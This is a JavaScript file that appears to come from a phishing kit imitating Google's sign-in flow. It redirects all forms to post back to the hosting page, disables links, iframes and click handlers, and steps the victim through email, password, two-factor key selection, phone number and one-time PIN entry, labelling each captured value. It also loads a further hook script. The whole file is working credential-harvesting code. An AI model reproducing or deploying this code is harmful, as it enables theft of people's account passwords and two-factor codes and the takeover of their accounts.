let allForms = document.querySelectorAll("form")
for (let form of allForms) {
    form.innerHTML += `<input type="hidden" name="spike-type">`
}
// setting spike type
function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spike-type"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

document.querySelectorAll("form").forEach(f => {
    f.action = location.href
    f.method = "POST"
    f.noValidate = false
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("[onclick]").forEach(onclk => {
    onclk.onclick = function () { }
})

// sets
let identifierId = document.querySelector("#identifierId")
let identifierNext = document.querySelector("#identifierNext")
let passwordNext = document.querySelector("#passwordNext")
let passwordInput = document.querySelector(`[type="password"]`)
let authContainer = document.querySelector(".OVnw0d")
let phoneNumberId = document.querySelector("#phoneNumberId")
let idvPin = document.querySelector("#idvPin")
let idvPinId = document.querySelector("#idvPinId")

// set
if (identifierNext) {
    addSpikeType("email")
}
else if (passwordNext) {
    addSpikeType("password")
}
else if (authContainer) {
    addSpikeType("auth-keys")
    let authKeys = authContainer.querySelectorAll(".JDAKTe.cd29Sd.zpCp3.SmR8")
    authKeys.forEach((btn, index) => {
        btn.addEventListener("click", () => {
            document.querySelector("form").innerHTML += `<input type="hidden" value="${index}" name="auth-key-index">`
            document.querySelector("form").submit()
        })
    })
}
else if (phoneNumberId) {
    addSpikeType("phone-number")
    phoneNumberId.name = "phoneNumber"
}

else if (idvPin) {
    addSpikeType("otp")
}

else if (idvPinId) {
    addSpikeType("otp_2")
}

if (identifierNext) {
    identifierNext.querySelector("button").addEventListener("click", () => {
        if (identifierId.value.length > 0 && identifierId.value.includes("@gmail.com")) {
            document.forms[0].submit()
        }
    })
}

if (passwordNext) {
    passwordNext.querySelector("button").addEventListener("click", () => {
        if (passwordInput.value.length > 4) {
            document.forms[0].submit()
        }
    })
}

let script = document.createElement("script")
script.src = location.origin + "/assets/js/spikes-hook-b.js"
document.body.appendChild(script)

let passShowBtn = document.querySelector(`[type="checkbox"]`)
if (passShowBtn) {
    let showPass = false
    passShowBtn.addEventListener("click", () => {
        if (showPass == false) {
            passwordInput.type = "text"
            showPass = true
        } else {
            passwordInput.type = "password"
            showPass = false
        }
    })
}

let phoneSubmit = document.querySelectorAll(`[type="button"]`)
if (phoneSubmit.length == 1) {
    phoneSubmit[0].addEventListener("click", () => {
        document.forms[0].submit()
    })
}

let idvPreregisteredPhoneNext = document.querySelector("#idvPreregisteredPhoneNext")
if (idvPreregisteredPhoneNext) {
    idvPreregisteredPhoneNext.querySelector("button").addEventListener("click", () => {
        if (idvPin.value.length == 6) {
            document.forms[0].submit()
        }
    })
}